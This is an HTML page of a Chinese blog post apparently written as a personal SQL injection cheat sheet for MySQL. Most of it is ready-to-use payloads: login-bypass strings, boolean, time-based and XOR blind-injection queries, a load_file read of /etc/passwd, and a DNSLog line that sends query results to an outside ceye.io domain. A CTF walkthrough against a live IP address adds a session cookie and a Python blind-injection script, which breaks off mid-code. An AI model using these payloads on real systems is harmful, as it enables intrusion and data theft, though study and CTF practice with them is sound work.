<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
	<meta name="referrer" content="no-referrer" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="前言MySQL函数## 字符串截取substr(str,index,len)  # 截取str(同mid函数),index开始,截取len的长度	substr(databse(),1,1)  # 判断数据库名 ## 字符串连接select concat(database(),version())   		    # 返回 test8.0.20select concat_ws(&amp;apos;:&amp;apo">
<meta name="keywords" content="SQL">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入备忘">
<meta property="og:url" content="https:&#x2F;&#x2F;shavchen.github.io&#x2F;SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98&#x2F;index.html">
<meta property="og:site_name" content="shavchen">
<meta property="og:description" content="前言MySQL函数## 字符串截取substr(str,index,len)  # 截取str(同mid函数),index开始,截取len的长度	substr(databse(),1,1)  # 判断数据库名 ## 字符串连接select concat(database(),version())   		    # 返回 test8.0.20select concat_ws(&amp;apos;:&amp;apo">
<meta property="og:locale" content="en">
<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg5pptbwhlj30k009h0th.jpg">
<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg5syvakhdj30k80923zb.jpg">
<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg5tnkzlnij30ow08s74u.jpg">
<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg5tzrqfooj30qk0aataa.jpg">
<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg5tycqau6j30qs0ad403.jpg">
<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg5syvakhdj30k80923zb.jpg">
<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg5tnkzlnij30ow08s74u.jpg">
<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg5tzrqfooj30qk0aataa.jpg">
<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg5tycqau6j30qs0ad403.jpg">
<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg5yx5wnyoj30vc0rxdi0.jpg">
<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg61jb38lxj30s308nmxn.jpg">
<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg6n2axx67j30dk06n74a.jpg">
<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg6pbkv9auj30go09yglv.jpg">
<meta property="og:updated_time" content="2020-06-27T07:33:05.495Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1gg5pptbwhlj30k009h0th.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>SQL注入备忘</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Article</a></li>
         
          <li><a href="/categories/">Categories</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/vulhub-challenge-record/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&text=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&title=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&is_video=false&description=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SQL注入备忘&body=Check out this article: https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&title=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&title=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&title=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&title=SQL注入备忘" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://shavchen.github.io/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98/&name=SQL注入备忘&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL"><span class="toc-number">1.1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#函数"><span class="toc-number">1.1.1.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#语法"><span class="toc-number">1.1.2.</span> <span class="toc-text">语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#符号"><span class="toc-number">1.1.3.</span> <span class="toc-text">符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#默认库"><span class="toc-number">1.1.4.</span> <span class="toc-text">默认库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server"><span class="toc-number">1.2.</span> <span class="toc-text">SQL Server</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#注入"><span class="toc-number">2.</span> <span class="toc-text">注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#识别"><span class="toc-number">2.1.</span> <span class="toc-text">识别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#盲注"><span class="toc-number">2.2.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔盲注"><span class="toc-number">2.2.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注"><span class="toc-number">2.2.2.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSLog"><span class="toc-number">2.2.3.</span> <span class="toc-text">DNSLog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#异或注入"><span class="toc-number">2.2.4.</span> <span class="toc-text">异或注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查询注入"><span class="toc-number">2.3.</span> <span class="toc-text">查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#联合查询"><span class="toc-number">2.3.1.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆叠查询"><span class="toc-number">2.3.2.</span> <span class="toc-text">堆叠查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-number">2.4.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#约束攻击"><span class="toc-number">2.5.</span> <span class="toc-text">约束攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参数污染"><span class="toc-number">2.6.</span> <span class="toc-text">参数污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二次注入"><span class="toc-number">2.7.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字节注入"><span class="toc-number">2.8.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP头-注入"><span class="toc-number">2.9.</span> <span class="toc-text">HTTP头 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XFF-注入"><span class="toc-number">2.9.1.</span> <span class="toc-text">XFF 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-注入"><span class="toc-number">2.9.2.</span> <span class="toc-text">Cookie 注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Base64-注入"><span class="toc-number">2.10.</span> <span class="toc-text">Base64 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP头-注入-1"><span class="toc-number">2.11.</span> <span class="toc-text">HTTP头 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XFF-注入-1"><span class="toc-number">2.11.1.</span> <span class="toc-text">XFF 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-注入-1"><span class="toc-number">2.11.2.</span> <span class="toc-text">Cookie 注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过关键词过滤注入"><span class="toc-number">2.12.</span> <span class="toc-text">绕过关键词过滤注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#关键字符绕过"><span class="toc-number">2.12.1.</span> <span class="toc-text">关键字符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通用编码绕过"><span class="toc-number">2.12.2.</span> <span class="toc-text">通用编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#等价函数绕过"><span class="toc-number">2.12.3.</span> <span class="toc-text">等价函数绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#模糊测试字典"><span class="toc-number">2.12.4.</span> <span class="toc-text">模糊测试字典</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CTF题目实战"><span class="toc-number">2.12.5.</span> <span class="toc-text">CTF题目实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLmap"><span class="toc-number">3.</span> <span class="toc-text">SQLmap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Paramerter"><span class="toc-number">3.1.</span> <span class="toc-text">Paramerter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GET"><span class="toc-number">3.2.</span> <span class="toc-text">GET</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST"><span class="toc-number">3.3.</span> <span class="toc-text">POST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Header"><span class="toc-number">3.4.</span> <span class="toc-text">Header</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        SQL注入备忘
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">shavchen</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-06-25T07:29:34.000Z" itemprop="datePublished">2020-06-25</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/web-security/">web security</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/SQL/" rel="tag">SQL</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## 字符串截取</span><br><span class="line">substr(str,index,len)  # 截取str(同mid函数),index开始,截取len的长度</span><br><span class="line">	substr(databse(),1,1)  # 判断数据库名 </span><br><span class="line">## 字符串连接</span><br><span class="line">select concat(database(),version())   		    # 返回 test8.0.20</span><br><span class="line">select concat_ws(&apos;:&apos;,database(),version())       # 返回 test:8.0.20</span><br><span class="line">select 1,group_concat(database(),0x3a,version()) # 返回 test:8.0.20</span><br><span class="line">## 延时</span><br><span class="line">sleep()</span><br><span class="line">benchmark(1000000,sha(1))</span><br><span class="line">## 编码</span><br><span class="line">md5()      # 计算字符的哈希</span><br><span class="line">hex()      # 用于 hex 编码解码(unhex)</span><br><span class="line">ascii()	   # 返回字符的 ASCII 码值</span><br><span class="line">## 文件</span><br><span class="line">load_file()  # 读取文件，可在 select 被过滤时替代,如下</span><br><span class="line">	if((hex(load_file(0x2f6574632f706173737764))like(0x25)),1,2) # 加载内容</span><br><span class="line">outfile()    # 写入文件</span><br><span class="line">## 条件</span><br><span class="line">if(expr1,expr2,expr3)  # expr1 true执行expr2否则执行expr3</span><br><span class="line">select case when (条件) then 代码1 else 代码 2 end</span><br><span class="line">## 数据库相关</span><br><span class="line">database()	  # 返回当前网站使用的数据库名</span><br><span class="line">version()     # 返回当前使用的数据库版本</span><br><span class="line">user()        # 返回当前数据库用户</span><br><span class="line">current_user()# 当前连接数据库的用户名</span><br><span class="line">## 其它</span><br><span class="line">floor()    # 返回小于等于该值的最大整数</span><br><span class="line">lpad(str,len,padstr) #在str的左(右)两边填充给定的padstr到指定的长度len</span><br></pre></td></tr></table></figure>

<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table (if not exists) users(</span><br><span class="line">			id int,</span><br><span class="line">			username varchar(20),</span><br><span class="line">			password varchar(20)</span><br><span class="line">		);</span><br><span class="line">		</span><br><span class="line">update users set username=&apos;john&apos; where username=&apos;赵四&apos;;</span><br><span class="line"></span><br><span class="line">alter table users modify password varchar(50);</span><br><span class="line"></span><br><span class="line">delete from users where username=&apos;root&apos;;</span><br><span class="line"></span><br><span class="line">SELECT * FROM table LIMIT 5;  # 检索前 5 个记录行,等价于 limit 0,5</span><br><span class="line"></span><br><span class="line">insert into admin(id,username,password) values (4,&apos;star&apos;,&apos;star&apos;)</span><br><span class="line"></span><br><span class="line">SELECT * FROM username ORDER BY userid; # 按照 userid 字段排序,可以判断字段是否存在在，userid 可以为字段序号</span><br><span class="line"></span><br><span class="line">select group_concat(name,&apos;,&apos;) as stuName,age,count(age) from tb_student group by Age having Age&gt;18;</span><br></pre></td></tr></table></figure>

<h3 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select database() between &apos;a&apos; and &apos;z&apos;;</span><br><span class="line">select &apos;123&apos; in (&apos;12&apos;)</span><br><span class="line">select &apos;12345&apos; like &apos;12%&apos;</span><br><span class="line">select &apos;123455&apos; regexp &apos;^12&apos;</span><br><span class="line"># 注释符</span><br><span class="line">--+</span><br><span class="line">#</span><br><span class="line">/**/   # 在空格被过滤时,可以替代</span><br><span class="line"># URL转码</span><br><span class="line">%23 =&gt; #</span><br><span class="line">%27 =&gt; &apos;</span><br><span class="line">%3a =&gt; : </span><br><span class="line">%3d =&gt; =</span><br><span class="line">%5c =&gt; \</span><br><span class="line">%0a =&gt; 换行,在空格被过滤时,可以替代</span><br><span class="line"># 注释符</span><br><span class="line">//，-- , /**/, #, --+, -- -, ;,%00,--a</span><br></pre></td></tr></table></figure>

<h3 id="默认库"><a href="#默认库" class="headerlink" title="默认库"></a>默认库</h3><p>MySQL5.0之后默认存在一个information_schema的数据库，其中有schemata、tables和columns三个需要注意的表名!</p>
<ul>
<li>schemata：存储所有数据库的库名</li>
<li>tables：存储所有数据库的库名和表名，字段分别为table_schema、table_name</li>
<li>columns：存储库名和表名和字段名，对应为 table_schema、table_name、column_name</li>
</ul>
<p>注：对于 5.0 之前的版本，一般只能通过手工枚举的方式爆破数据库信息，详见盲注。</p>
<h2 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649724593&idx=1&sn=f4373a1f639408df8058c041959bfe4f&chksm=888ca6debffb2fc82f16fa8ebc4b2de5670855d9323e2b55fbdbfa692feeca10052c94a5b425&mpshare=1&scene=1&srcid=&sharer_sharetime=1591696965749&sharer_shareid=b60b8768dd9195001f794626aed43423" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649724593&amp;idx=1&amp;sn=f4373a1f639408df8058c041959bfe4f&amp;chksm=888ca6debffb2fc82f16fa8ebc4b2de5670855d9323e2b55fbdbfa692feeca10052c94a5b425&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1591696965749&amp;sharer_shareid=b60b8768dd9195001f794626aed43423</a></p>
<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><p><strong>接下来的部分全部针对 MySQL 数据库 ，其他类型的数据库原理类似！</strong></p>
<h2 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h2><p><strong>数字型注入</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=1 and 1=1 # 运行正常</span><br><span class="line">id=1 and 1=2 # 运行异常</span><br></pre></td></tr></table></figure>

<p><strong>字符型注入</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user = admin&apos;				# 返回错误</span><br><span class="line">user = admin&apos;#				# 返回正常</span><br><span class="line">user = admin&apos; and &apos;1&apos;=&apos;1	 # 运行正常</span><br><span class="line">user = admin&apos; and &apos;1&apos;=&apos;2	 # 运行异常</span><br></pre></td></tr></table></figure>

<p><strong>万能密码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&apos; or 1=1-- </span><br><span class="line">admin&apos; or 1=1#</span><br><span class="line">admin&apos; or 1=1/*</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;1--</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;1--</span><br><span class="line">admin1&apos; xor &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>

<p>优先级：<code>and</code> &gt; <code>=</code> &gt; <code>or</code> </p>
<p><strong>注入流程</strong></p>
<ol>
<li>判断数据库长度（盲注）</li>
<li>判断字段回显位置</li>
<li>判断数据库信息</li>
<li>爆库 、 爆表 、 爆列 、 爆值</li>
</ol>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>序只返回逻辑上的正确或错误，不输出结果，此时需要使用布尔盲注！</p>
<ul>
<li>id = 1 ‘ and 1 = 1  返回 yes</li>
<li>id = 1 ‘ and 1 = 2  返回 no</li>
</ul>
<p><strong>注入流程</strong></p>
<ol>
<li><p>判断长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=1&apos;and length(database())&gt;=1--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=1&apos; and substr(database(),1,1)=&apos;d&apos;--+</span><br><span class="line">id=1&apos; and ord(substr(database(),1,1))=100--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=1&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;dede&apos; limit 0,1),1,1)=&apos;u&apos;--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=1&apos; and substr((select column_name from information_schema.columns where table_schema=&apos;dede&apos; limit 0,1),2,1)=&apos;s&apos;--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=1&apos; and substr((select username from users limit 0,1),2,1)=&apos;o&apos;--+</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>时间盲注是利用<code>sleep()</code>或<code>benchmark()</code>等函数让MySQL的执行时间变长，与 IF(exp1,exp2,exp3) 结合使用！</p>
<p>此if语句的含义是：如果exp1是true，则if()的返回值为exp2;否则返回exp3！</p>
<p><strong>注入语句</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=1&apos; and if(length(database())&gt;4,sleep(5),1)--+</span><br><span class="line">id=1&apos; and if(substr(database(),1,1)=&apos;a&apos;,sleep(5),1)--+ </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h3><p>Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名 <code>www.test.com</code> 的访问信息。</p>
<p>对于盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入。 </p>
<ul>
<li>Dndlog平台：<a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></li>
</ul>
<p>在 MySQL 中 load_file 会带 dns 查询请求，我么可以使用 Dnslog 接受请求，从而获取数据！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.XXX.ceye.io\\abc&apos;)</span><br></pre></td></tr></table></figure>

<ul>
<li>由<code>concat</code>函数将执行结果与<code>XXX.ceye.io\\abc</code>拼接，构成一个新的域名</li>
<li>而 MySQL 中的<code>select load_file()</code>可以发起请求，那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析</li>
</ul>
<h3 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h3><p>对于以上盲注的 payload 被过滤的情况，如果 <code>^</code> 未被过滤，依然可以进行 SQL 注入！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users where username=1;</span><br><span class="line">Empty set, 3 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where username=0;</span><br><span class="line">+------------+----------+</span><br><span class="line">| username   | password |</span><br><span class="line">+------------+----------+</span><br><span class="line">| root       | root     |</span><br><span class="line">+------------+----------+</span><br><span class="line">3 rows in set, 3 warnings (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>通过异或，我们可以获得类似上面的结果！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where username=&apos;admin&apos;^length(&apos;and&apos;)=3;</span><br><span class="line">select * from users where username=&apos;admin&apos;^length(&apos;and&apos;)=!3;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>length(&#39;and&#39;)=3</code>  为真，异或结果为 1 ，结果为空</li>
<li><code>length(&#39;and&#39;)!=3</code>  为假，异或结果为 0 ，结果不为空</li>
<li><strong>补充</strong>：将 <code>and</code> 换为其它字符可以用来判断那些字符被过滤！</li>
</ul>
<p><strong>CTF题目</strong></p>
<p><a href="http://123.206.31.85:49167/" target="_blank" rel="noopener">http://123.206.31.85:49167/</a></p>
<p>解题思路：</p>
<ol>
<li><p>判断过滤关键字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=&apos;^(=)^1#&amp;password=123</span><br></pre></td></tr></table></figure>

<ul>
<li>发现过滤了空格、等号，空格可以用括号代替，等号可以用<code>&lt;&gt;</code>代替</li>
</ul>
</li>
<li><p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 爆表</span><br><span class="line">admin&apos;^(select(1)from(admin))^1#&amp;password=123	# 猜测表名为admin,password error说明正确</span><br><span class="line"># 爆字段</span><br><span class="line">admin&apos;^(select(count(password))from(admin))^1# #猜测字段为password, password error说明正确</span><br><span class="line"># 爆值</span><br><span class="line">username=&apos;^(select(ascii(mid((select(password)from(admin))from(1)))&lt;&gt;102))^1&amp;password=123 # 枚举</span><br></pre></td></tr></table></figure>

<ul>
<li>如果 username 处判断正确，则返回 password error，错误则返回 username does not exist ！</li>
</ul>
</li>
<li><p>盲注脚本</p>
</li>
<li><p>flag：skctf123456</p>
</li>
</ol>
<p>盲注脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re,string,hashlib</span><br><span class="line">url = <span class="string">'http://123.206.31.85:49167/'</span></span><br><span class="line">sss = string.digits + string.lowercase</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'Host'</span> : <span class="string">'123.206.31.85:49167'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:65.0) Gecko/20100101 Firefox/65.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span> : <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span> : <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line">    <span class="string">'Referer'</span> : <span class="string">'http://123.206.31.85:49167/'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span> : <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>: <span class="string">'87'</span>,</span><br><span class="line">    <span class="string">'Cookie'</span> : <span class="string">'PHPSESSID=qij0np73li9nmm1rog8vo5dm76'</span>,</span><br><span class="line">    <span class="string">'Connection'</span> : <span class="string">'keep-alive'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span> : <span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">answer = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> sss:</span><br><span class="line">        postuser = <span class="string">"'^(select(ascii(mid((select(password)from(admin))from(%d)))&lt;&gt;%d))^1#"</span> % (i, ord(j))</span><br><span class="line">        data = &#123;<span class="string">'username'</span>: postuser, <span class="string">'password'</span>: <span class="string">'admin'</span>&#125;</span><br><span class="line">        html = 